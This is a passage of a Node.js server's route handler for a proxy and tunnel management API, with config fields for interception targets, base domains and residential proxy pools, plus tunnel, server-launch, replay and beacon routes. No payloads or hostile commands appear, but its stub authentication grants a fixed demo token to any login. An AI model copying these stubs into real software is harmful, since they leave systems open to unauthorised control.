        "INTERCEPT_LAB_MODE",
        "INTERCEPT_ALLOWLIST",
        "INTERCEPT_BLOCKLIST",
        "INTERCEPT_TTL_SECONDS",
        "API_KEY",
        "CF_API_KEY",
        "CF_API_EMAIL",
        "CF_API_TOKEN",
        "PROXY_TARGET",
        "BASE_DOMAIN",
        "RESIDENTIAL_PROXY_POOL",
      ];
      for (const [k, v] of Object.entries(body)) {
        if (validFields.includes(k)) {
          configStore[k] = String(v);
        }
      }
      const masked = { ...configStore };
      if (masked.API_KEY) masked.API_KEY = "***";
      return json(res, 200, { success: true, data: masked }, cors);
    }
    if (method === "DELETE") {
      const authErr = checkAuth(req);
      if (authErr) return json(res, authErr.status, authErr.body, cors);
      for (const k of Object.keys(configStore)) {
        delete configStore[k];
      }
      return json(res, 200, { success: true, data: {} }, cors);
    }
    return json(res, 405, { success: false, error: "method not allowed" }, cors);
  }

  // ── Proxy tunnels (Pangolin/frp/NetBird — replaces Cloudflare zones) ───

  // GET /api/proxy/tunnels — list all tunnels
  if (pathname === "/api/proxy/tunnels" && method === "GET") {
    const result = await proxyManagerFetch("/api/proxy/tunnels");
    return json(res, result.status, result.body, cors);
  }

  // POST /api/proxy/tunnels — create a new tunnel
  if (pathname === "/api/proxy/tunnels" && method === "POST") {
    const authErr = checkAuth(req);
    if (authErr) return json(res, authErr.status, authErr.body, cors);
    const body = await readBody(req);
    const result = await proxyManagerFetch("/api/proxy/tunnels", { method: "POST", body });
    return json(res, result.status, result.body, cors);
  }

  // GET /api/proxy/status — overall proxy health
  if (pathname === "/api/proxy/status" && method === "GET") {
    const result = await proxyManagerFetch("/api/proxy/status");
    return json(res, result.status, result.body, cors);
  }

  // Tunnel-specific operations
  const tunnelMatch = pathname.match(/^\/api\/proxy\/tunnels\/(\d+)$/);
  if (tunnelMatch && method === "GET") {
    const result = await proxyManagerFetch(`/api/proxy/tunnels/${tunnelMatch[1]}`);
    return json(res, result.status, result.body, cors);
  }
  if (tunnelMatch && method === "DELETE") {
    const authErr = checkAuth(req);
    if (authErr) return json(res, authErr.status, authErr.body, cors);
    const result = await proxyManagerFetch(`/api/proxy/tunnels/${tunnelMatch[1]}`, { method: "DELETE" });
    return json(res, result.status, result.body, cors);
  }

  const tunnelStartMatch = pathname.match(/^\/api\/proxy\/tunnels\/(\d+)\/start$/);
  if (tunnelStartMatch && method === "POST") {
    const authErr = checkAuth(req);
    if (authErr) return json(res, authErr.status, authErr.body, cors);
    const result = await proxyManagerFetch(`/api/proxy/tunnels/${tunnelStartMatch[1]}/start`, { method: "POST" });
    return json(res, result.status, result.body, cors);
  }

  const tunnelStopMatch = pathname.match(/^\/api\/proxy\/tunnels\/(\d+)\/stop$/);
  if (tunnelStopMatch && method === "POST") {
    const authErr = checkAuth(req);
    if (authErr) return json(res, authErr.status, authErr.body, cors);
    const result = await proxyManagerFetch(`/api/proxy/tunnels/${tunnelStopMatch[1]}/stop`, { method: "POST" });
    return json(res, result.status, result.body, cors);
  }

  // ── Proxy server launch management (Grok Build 0.1 powered) ───

  // POST /api/proxy/servers/configure — Grok Build 0.1 generates optimal server config
  if (pathname === "/api/proxy/servers/configure" && method === "POST") {
    const authErr = checkAuth(req);
    if (authErr) return json(res, authErr.status, authErr.body, cors);
    const body = await readBody(req);
    if (!body?.targetHost) return json(res, 400, { success: false, error: "targetHost is required" }, cors);

    const aiResult = await callGrokBuild("generate", {
      targetHost: body.targetHost,
      ports: body.ports,
      tunnelCount: body.tunnelCount || 1,
    });

    if (aiResult?.config) {
      return json(res, 200, {
        success: true,
        data: { config: aiResult.config, model: GROK_MODEL, generated: true },
      }, cors);
    }

    // Fallback: generate deterministic config
    const fallbackConfig = [
      "# Edge Gateway proxy server config",
      `# Target: ${body.targetHost}`,
      "",
      "[server]",
      "bindAddr = \"0.0.0.0\"",
      `bindPort = ${body.ports?.[0] || 12000}`,
      "",
      "[health]",
      "path = \"/health\"",
      "intervalSeconds = 30",
      "timeoutSeconds = 5",
      "",
      "[[proxies]]",
      `name = \"${body.targetHost.replace(/[^a-zA-Z0-9]/g, "-")}\"`,
      "type = \"http\"",
      "localIP = \"127.0.0.1\"",
      "localPort = 8787",
      "remotePort = 10000",
      "autoStart = true",
    ].join("\n");

    return json(res, 200, {
      success: true,
      data: { config: fallbackConfig, generated: false },
    }, cors);
  }

  // POST /api/proxy/servers/validate — Grok Build 0.1 validates a config
  if (pathname === "/api/proxy/servers/validate" && method === "POST") {
    const authErr = checkAuth(req);
    if (authErr) return json(res, authErr.status, authErr.body, cors);
    const body = await readBody(req);
    if (!body?.config) return json(res, 400, { success: false, error: "config is required" }, cors);

    const aiResult = await callGrokBuild("validate", {
      targetHost: body.targetHost || "unknown",
      existingConfig: body.config,
    });

    return json(res, 200, {
      success: true,
      data: aiResult?.validation || { valid: true, issues: [] },
    }, cors);
  }

  // POST /api/proxy/servers/launch — launch a new proxy server instance
  if (pathname === "/api/proxy/servers/launch" && method === "POST") {
    const authErr = checkAuth(req);
    if (authErr) return json(res, authErr.status, authErr.body, cors);
    const body = await readBody(req);
    const result = await proxyManagerFetch("/api/proxy/servers/launch", { method: "POST", body });
    return json(res, result.status, result.body, cors);
  }

  // GET /api/proxy/servers — list all launched servers
  if (pathname === "/api/proxy/servers" && method === "GET") {
    const result = await proxyManagerFetch("/api/proxy/servers");
    return json(res, result.status, result.body, cors);
  }

  // Server-specific operations
  const serverMatch = pathname.match(/^\/api\/proxy\/servers\/(\d+)$/);
  if (serverMatch && method === "GET") {
    const result = await proxyManagerFetch(`/api/proxy/servers/${serverMatch[1]}`);
    return json(res, result.status, result.body, cors);
  }

  const serverStopMatch = pathname.match(/^\/api\/proxy\/servers\/(\d+)\/stop$/);
  if (serverStopMatch && method === "POST") {
    const authErr = checkAuth(req);
    if (authErr) return json(res, authErr.status, authErr.body, cors);
    const result = await proxyManagerFetch(`/api/proxy/servers/${serverStopMatch[1]}/stop`, { method: "POST" });
    return json(res, result.status, result.body, cors);
  }

  const serverLogsMatch = pathname.match(/^\/api\/proxy\/servers\/(\d+)\/logs$/);
  if (serverLogsMatch && method === "GET") {
    const authErr = checkAuth(req);
    if (authErr) return json(res, authErr.status, authErr.body, cors);
    const result = await proxyManagerFetch(`/api/proxy/servers/${serverLogsMatch[1]}/logs`);
    return json(res, result.status, result.body, cors);
  }

  // ── Cloudflare compat stubs (mapped to proxy tunnels for frontend compat) ─
  if (route.type === "zones") {
    // Return proxy tunnels mapped as Cloudflare zones
    const result = await proxyManagerFetch("/api/proxy/tunnels");
    const tunnels = result.body?.data || [];
    const zones = tunnels.map((t) => ({
      id: `tunnel-${t.id}`,
      name: t.name,
      status: t.status === "running" ? "active" : "paused",
      type: "self-hosted",
    }));
    return json(res, 200, { success: true, configured: tunnels.length > 0, data: zones }, cors);
  }

  if (route.type === "allocate") {
    const authErr = checkAuth(req);
    if (authErr) return json(res, authErr.status, authErr.body, cors);
    const body = await readBody(req);
    // Create a proxy tunnel for this allocation
    const proxy = proxies.find((p) => p.id === body?.proxyId);
    const tunnelResult = await proxyManagerFetch("/api/proxy/tunnels", {
      method: "POST",
      body: {
        name: proxy ? proxy.slug : (body?.hostname || "proxy"),
        type: "http",
        localIP: "127.0.0.1",
        localPort: PORT,
        remotePort: Math.floor(Math.random() * 10000) + 10000,
        autoStart: true,
      },
    });
    const tunnel = tunnelResult.body?.data || {};
    return json(res, 200, {
      success: true,
      data: { hostname: body?.hostname || "proxy.example.com", target: `127.0.0.1:${tunnel.remotePort || PORT}`, tunnelId: tunnel.id },
    }, cors);
  }

  if (route.type === "wildcard") {
    const authErr = checkAuth(req);
    if (authErr) return json(res, authErr.status, authErr.body, cors);
    const result = await proxyManagerFetch("/api/proxy/status");
    return json(res, 200, { success: true, data: result.body?.data || {} }, cors);
  }

  if (route.type === "workerRoutes") {
    const result = await proxyManagerFetch("/api/proxy/tunnels");
    const tunnels = result.body?.data || [];
    const routes = tunnels.map((t) => ({
      id: `${t.id}`,
      pattern: `${t.type}://*:${t.remotePort}/*`,
      status: t.status,
    }));
    return json(res, 200, { success: true, configured: tunnels.length > 0, data: routes }, cors);
  }

  if (route.type === "workerRouteDelete") {
    const authErr = checkAuth(req);
    if (authErr) return json(res, authErr.status, authErr.body, cors);
    const result = await proxyManagerFetch(`/api/proxy/tunnels/${route.routeId}`, { method: "DELETE" });
    return json(res, result.status, result.body, cors);
  }

  // Replay
  if (route.type === "replay") {
    const authErr = checkAuth(req);
    if (authErr) return json(res, authErr.status, authErr.body, cors);
    return json(
      res,
      200,
      { success: true, data: { report: {}, entries: [] } },
      cors,
    );
  }

  // Beacon (fire-and-forget)
  if (route.type === "beacon") {
    res.writeHead(204, cors);
    res.end();
    return;
  }

  // Auth routes (stub — auth is handled by API key)
  if (route.type === "auth") {
    const subPath = pathname.replace("/api/auth/", "");
    if (subPath === "signup" && method === "POST") {
      const body = await readBody(req);
      return json(res, 201, {
        success: true,
        data: { token: "demo-token", user: { email: body?.email || "demo@example.com" } },
      }, cors);
    }
    if (subPath === "login" && method === "POST") {
      return json(res, 200, {
        success: true,
        data: { token: "demo-token", user: { email: "demo@example.com" } },
      }, cors);
    }
    if (subPath === "me" && method === "GET") {
      return json(res, 200, {
        success: true,
        data: { user: { email: "demo@example.com", id: 1 } },
      }, cors);
    }
    return json(res, 404, { success: false, error: "not found" }, cors);
  }

  // Unknown route
  return json(res, 404, { success: false, error: "not found" }, cors);
}

// ── Start server ────────────────────────────────────────────────────────────
const server = http.createServer(handleRequest);
server.listen(PORT, "0.0.0.0", () => {
  console.log(`[server] listening on http://0.0.0.0:${PORT}`);
  console.log(`[server] API_KEY ${API_KEY ? "configured" : "not set (auth disabled)"}`);
});
